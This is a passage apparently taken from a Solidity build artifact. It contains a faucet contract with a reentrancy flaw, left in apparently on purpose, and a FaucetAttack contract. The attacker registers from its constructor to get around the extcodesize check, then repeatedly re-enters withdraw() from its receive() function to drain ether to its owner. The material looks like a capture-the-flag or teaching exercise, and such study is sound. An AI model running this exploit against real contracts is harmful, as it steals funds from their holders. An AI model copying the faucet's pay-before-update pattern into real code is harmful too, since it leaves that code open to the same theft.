pragma solidity ^0.8.0;

contract Faucet {

    mapping(address => uint256) public users;
    mapping(address => bool) public paidUsers;

    constructor () payable {}

    function register(address user) external {
        require(!isContract(user), "EOA only");
        require(!paidUsers[user], "Already paid");
        users[user] = block.number;
    }

    function withdraw() external payable {
        require(isContract(msg.sender), "Contract only");
        require(address(this).balance >= 0.001 ether, "Faucet empty");
        require(users[msg.sender] > 0, "User not registered");
        require(users[msg.sender] < block.number, "Smells fishy");
        (bool sent, ) = payable(msg.sender).call{value: 0.001 ether}("");
        require(sent, "Failed to send");
        users[msg.sender] = 0;
        paidUsers[msg.sender] = true;
    }

    function isContract(address _addr) private view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }
}","keccak256":"0x06b110c19a165373472d9edde95976147302bfcd37679655a9f8b553bb9df22d","license":"MIT"},"contracts/FaucetAttack.sol":{"content":"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import './Faucet.sol';

contract FaucetAttack is Ownable {
    Faucet public faucet;
    uint8 i;

    constructor(address faucet_) {
        i = 1;
        faucet = Faucet(faucet_);
        faucet.register(address(this));
    }

    receive() external payable {
        if (i != 10) {
            i += 1;
            faucet.withdraw();
        }
    }

    function withdraw() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function hack() external onlyOwner {
        faucet.withdraw();
    }
